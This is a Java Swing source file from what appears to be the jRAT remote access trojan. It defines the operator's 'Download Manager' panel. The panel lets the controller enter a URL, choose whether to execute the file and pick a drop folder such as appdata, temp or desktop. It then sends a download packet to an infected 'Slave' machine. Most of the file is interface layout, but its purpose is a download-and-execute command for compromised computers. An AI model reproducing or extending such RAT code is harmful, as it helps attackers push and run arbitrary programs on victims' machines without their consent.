package se.jrat.client.ui.panels;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.table.DefaultTableModel;

import se.jrat.client.Slave;
import se.jrat.client.packets.outgoing.Packet34AdvancedDownload;
import se.jrat.client.ui.components.DefaultJTable;
import se.jrat.client.utils.IconUtils;


@SuppressWarnings("serial")
public class PanelControlDownloadManager extends PanelControlParent {

	private JTable table;
	private DefaultTableModel model;
	private JTextField txtURL;
	private JCheckBox chckbxExecute;
	@SuppressWarnings("rawtypes")
	private JComboBox comboBox;

	public DefaultTableModel getModel() {
		return model;
	}

	@SuppressWarnings({ "rawtypes", "unchecked" })
	public PanelControlDownloadManager(Slave slave) {
		super(slave);
		final Slave sl = slave;

		JScrollPane scrollPane = new JScrollPane();

		JLabel lblUrl = new JLabel("URL:");

		txtURL = new JTextField();
		txtURL.setColumns(10);

		chckbxExecute = new JCheckBox("Execute");

		JLabel lblDropDir = new JLabel("Drop dir:");

		comboBox = new JComboBox();
		comboBox.setModel(new DefaultComboBoxModel(new String[] { "appdata", "temp/documents (UNIX)", "desktop" }));

		JButton btnDownload = new JButton("Download");
		btnDownload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				for (int i = 0; i < model.getRowCount(); i++) {
					String key = model.getValueAt(i, 1).toString();
					if (key.equals(txtURL.getText().trim())) {
						model.removeRow(i);
					}
				}
				model.addRow(new Object[] { IconUtils.getIcon("update", true), txtURL.getText().trim(), chckbxExecute.isSelected() + "", comboBox.getSelectedItem().toString(), "Sent..." });

				sl.addToSendQueue(new Packet34AdvancedDownload(txtURL.getText().trim(), chckbxExecute.isSelected(), comboBox.getSelectedItem().toString().toLowerCase()));
			}
		});
		btnDownload.setIcon(IconUtils.getIcon("arrow-down"));

		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE).addGroup(groupLayout.createSequentialGroup().addGap(16).addComponent(lblUrl).addPreferredGap(ComponentPlacement.RELATED).addComponent(txtURL, GroupLayout.PREFERRED_SIZE, 186, GroupLayout.PREFERRED_SIZE).addGap(12).addComponent(chckbxExecute).addPreferredGap(ComponentPlacement.RELATED, 30, Short.MAX_VALUE).addComponent(lblDropDir).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(comboBox, GroupLayout.PREFERRED_SIZE, 103, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnDownload).addContainerGap()));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 297, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addPreferredGap(ComponentPlacement.RELATED).addComponent(btnDownload)).addGroup(groupLayout.createSequentialGroup().addPreferredGap(ComponentPlacement.UNRELATED).addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(chckbxExecute).addComponent(txtURL, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblUrl).addComponent(lblDropDir))))).addContainerGap(20, Short.MAX_VALUE)));

		table = new DefaultJTable() {
			@Override
			public Class getColumnClass(int column) {
				if (column == 0) {
					return ImageIcon.class;
				}
				return super.getColumnClass(column);
			}
		};
		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { " ", "URL", "Execute", "Drop directory", "Status" }));
		table.getColumnModel().getColumn(0).setPreferredWidth(30);
		table.getColumnModel().getColumn(1).setPreferredWidth(267);
		table.getColumnModel().getColumn(2).setPreferredWidth(108);
		table.getColumnModel().getColumn(3).setPreferredWidth(73);
		table.getColumnModel().getColumn(4).setPreferredWidth(127);
		table.setRowHeight(30);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);
	}
}
